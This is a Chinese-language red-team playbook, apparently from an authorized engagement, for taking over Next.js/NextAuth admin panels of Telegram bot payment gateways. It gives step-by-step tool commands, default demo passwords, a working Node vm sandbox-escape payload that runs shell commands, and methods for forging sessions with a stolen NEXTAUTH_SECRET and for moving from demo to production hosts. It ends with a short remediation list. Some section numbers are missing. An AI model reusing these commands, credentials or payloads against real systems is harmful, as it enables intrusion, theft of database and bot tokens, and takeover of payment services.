# TG Bot 管理后台 — NEXTAUTH + JS 沙箱逃逸 全链接管手法

**适用目标**：Next.js + NEXTAUTH 的 TG Bot 支付网关管理后台（KyberRouter 家族）  
**案例来源**： <授权主机> 授权红队 / 2026-08-03（手法可复用；赃物不可复用）  
**风险等级**：CRITICAL（产品级，多部署通用）  
**Skill**：`杀招/太白云生·接管`  
**工具**：`炼蛊房/tg_nextauth_takeover.py`

## 二、攻击路径

```
① fingerprint / 文档默认凭据
       ↓
② login → admin_session（有身份先填对象矩阵）
       ↓
③ 技能沙箱逃逸 → RCE
       ↓
④ 抽 NEXTAUTH_SECRET / DATABASE_URL / BOT_TOKEN
       ↓

       ↓
⑥ admin-enum（订单/渠道/bot/key）
       ↓
⑦ verify-bot 只读 getMe；改 webhook 先问
```

## 三、命令（仓库真源）

`--base` / `--case` 跟在**子命令后面**（与 `tg_bot_admin_bac.py` 同风格）。

```bash
python3 炼蛊房/tg_nextauth_takeover.py selftest

python3 炼蛊房/tg_nextauth_takeover.py fingerprint --base https://目标 --case <案卷>
python3 炼蛊房/tg_nextauth_takeover.py doc-creds --base https://目标 --case <案卷>
python3 炼蛊房/tg_nextauth_takeover.py login --base https://目标 --case <案卷> \
  --email test@gmail.com --password 123456

python3 炼蛊房/tg_nextauth_takeover.py sandbox-rce --base https://目标 --case <案卷> \
  --cookie "$ADMIN_COOKIE"
# 调试残留：加 --no-cleanup ；只跑探测：--stage probe

python3 炼蛊房/tg_nextauth_takeover.py forge-session --base https://目标 --case <案卷> \
  --secret "$NEXTAUTH_SECRET" --email admin@example.com
python3 炼蛊房/tg_nextauth_takeover.py hop --base https://演示 --case <案卷> \
  --secret "$NEXTAUTH_SECRET" --email admin@example.com \
  --targets https://生产

python3 炼蛊房/tg_nextauth_takeover.py admin-enum --base https://目标 --case <案卷> \
  --cookie "$ADMIN_COOKIE"
python3 炼蛊房/tg_nextauth_takeover.py verify-bot --case <案卷> --token "$BOT_TOKEN"
```

证据目录：`案卷/<案卷>/案卷/tg_nextauth/`（敏感文件 chmod 600）。

## 四、手工要点

### 4.1 文档凭据

常见路径：`/docs/` `/docs/system-guide` `/docs/admin-guide` `/docs/setup` `/readme`

产品族默认（文档/演示）：

```
test@gmail.com       / 123456
admin@demo.local     / kkajfio!#k
admin@yourdomain.com / jasjwe#k!
```

登录必须看 **Set-Cookie**，不能只看 JSON 里有没有 `token` 这个词。

### 4.2 JS 沙箱逃逸

原理：技能执行走 Node `vm`，未切断 `constructor` 链。

```javascript
this.constructor.constructor('return process')().version
this.constructor.constructor('return process')()
  .mainModule.require('child_process').execSync('id').toString()
```

工具会轮询 `/api/admin/skills` `/api/skills` `/api/v1/admin/skills`，并尝试 `script`/`code`/`content` 字段；执行后默认 DELETE。

### 4.3 session 伪造（必须多变体）

报告实测过一种：

```
admin_session = base64url(payload) + "." + base64url(HMAC-SHA256(payload, secret))
```

`payload` 可能是 raw JSON，也可能是已经 base64url 的那一段。标准 NextAuth 则是三节 JWT（`header.payload.sig`），cookie 名可能是 `next-auth.session-token`。

`forge-session` 会依次试：HMAC(raw) / HMAC(b64) / JWT + 两种 cookie 名。  
若全部失败：secret 可能用于 **JWE**（加密会话），不能只靠 HMAC 伪造。

### 4.4 横移

同一镜像/`.env.example` 默认 secret 时，演示 RCE 提到的密钥可以直接打生产。新域名先 `scope_expand`。

### 4.5 Bot token

`verify-bot` 只打 `getMe`。发消息、改 webhook → 先问，走 `tg-bot-webhook-hijack --confirm`。

## 六、修复建议（给运营方）

1. 沙箱切断 `constructor` 链；禁用 `child_process`/`process`；或换 Worker + 资源限制  
2. 每个部署独立 `openssl rand -hex 32`，禁止共享默认 `NEXTAUTH_SECRET`  
3. 轮换 DB / Bot Token / LLM Key / API Key  
4. 文档去掉演示口令；演示与生产网络隔离  
5. Cookie：`HttpOnly` + `Secure` + `SameSite`；登录限流  
6. CORS 不可 `*` + `credentials`

---

*不要和 `tg-bot-webhook-hijack`（USER 写 Bot 配置）或 `tg-cloud-panel`（Sticker/Fernet）混卡。*
